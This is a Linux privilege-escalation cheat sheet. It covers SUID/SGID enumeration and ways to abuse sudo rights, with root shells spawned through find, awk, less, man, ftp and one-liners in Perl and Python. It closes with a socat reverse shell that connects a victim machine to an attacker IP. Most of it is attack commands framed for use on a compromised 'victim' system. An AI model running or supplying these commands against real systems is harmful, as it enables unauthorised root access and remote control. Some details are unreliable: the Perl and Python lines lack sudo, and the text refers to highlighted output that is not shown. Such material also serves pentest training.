Enumeration is the key.
(Linux) privilege escalation is all about:
Collect - Enumeration, more enumeration and some more enumeration.
Process - Sort through data, analyse and prioritisation.
Search - Know what to search for and where to find the exploit code.
Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
Try - Get ready for (lots of) trial and error.

find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)

### Linux Privilege Escalation using Sudo Rights
NOTE:

(ALL:ALL) can also represent as (ALL)
If you found (root) in place of (ALL:ALL) then it denotes that user can run the command as root.
If nothing is mention for user/group then it means sudo defaults to the root user.

# Traditional Method to assign Root Privilege 
visudo
usertest ALL=(ALL:ALL) ALL
or
usertest ALL=(ALL) ALL

# Spawn Root Access
Suppose you successfully login into victim’s machine through ssh and want to know sudo rights for the current user then execute below command.
sudo -l
In the traditional method, PASSWD option is enabled for user authentication while executing above command and it can be disabled by using NOPASSWD tag. The highlighted text is indicating that current user is authorized to execute all command. Therefore we have obtained root access by executing the command.
sudo su
id

# Default Method to assign Root Privilege 
Default Method to assign Root Privilege to usertest under User Privilege Specification category.
visudo
usertest ALL=ALL
or
usertest ALL=(root) ALL

# Allow Root Privilege to Binary commands
Sometimes the user has the authorization to execute any file or command of a particular directory such as /bin/cp, /bin/cat or /usr/bin/ find, this type of permission lead to privilege escalation for root access and it can be implemented with help of following steps.
usertest ALL=(root) NOPASSWD: /usr/bin/find
NOTE: Here NOPASSWD tag that means no password will be requested for the user while running sudo -l command.
 
# Spawn Root Access using Find Command
compromised the Victim’s system and then move for privilege escalation phase and execute below command to view sudo user list.
sudo -l
>	User usertest may run the following commands on ubuntu
>	(root) NOPASSWD: /usr/bin/find
indicating that the usertest can run any command through find command. Therefore we got root access by executing below commands.
sudo find /home -exec /bin/bash \;
id
>	uid=0(root) gid=0(root) groups=0(root)

# Allow Root Privilege to Binary Programs
Sometimes admin assigns delicate authorities to a particular user to run binary programs which allow a user to edit any system files such as /etc/passwd and so on. certain binary programs lead to privilege escalation. In the following command we have assign sudo rights to the following program which can be run as root user.
usertest ALL= (root) NOPASSWD: usr/bin/perl, /usr/bin/python, /usr/bin/less, /usr/bin/awk, /usr/bin/man, /usr/bin/vi

# Spawn shell using Perl one-liner
At the time of privilege, escalation phase executes below command to view sudo user list.
sudo -l
Now you can observe the text is showing that the usertest can run Perl language program or script as root user. (/usr/bin/perl) Therefore we got root access by executing Perl one-liner.
perl -e 'exec "/bin/bash";'

# Spawn shell using Python one-liner 
requires that the user can run the python language or script as root user. (/usr/bin/python) this can be determined by running
sudo -l 
thus we can aquire root access by executing the python one-liner
python -c 'import pty;pty.spawn("/bin/bash")'

# Spawn shell using Less Command
requires that the user can run the less command as root user. (usr/bin/less) this can be determined by running
sudo -l
Hence we obtained root access by executing following
sudo less /etc/hosts
It will open requested system file for editing, BUT for spawning root shell type !bash as shown below and hit enter.
!bash
You will get root access.

# Spawn shell using AWK one-liner 
requires that the user can run the AWK language program or script as root user. (usr/bin/awk) this can be determined by running
sudo -l
Therefore we obtained root access by executing AWK one-liner.
sudo awk 'BEGIN {system("/bin/bash")}'

# Spawn shell using Man Command (Manual page)
requires that the user can run the less command as root user. (usr/bin/man) this can be determined by running
sudo -l
sudo man man 
It will be displaying Linux manual pages for editing, BUT for spawning root shell type !bash as presented below and hit enter, you get root access as done above using Less command.
!bash 
You will get root access.

# Spawn Shell Using FTP
get root access through FTP with the help of following commands:
sudo ftp
! /bin/bash
whoami
or
! /bin/sh
id
whoami
>	root

# Spawn Shell Using Socat
get root access through socat with the help of following commands. Execute below command on the attacker’s terminal in order to enable listener for reverse connection.
socat file:`tty`,raw,echo=0 tcp-listen:1234
Then run the following command on victim’s machine and you will get root access on your attacker machine.
socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
id 
whoami 
>	root
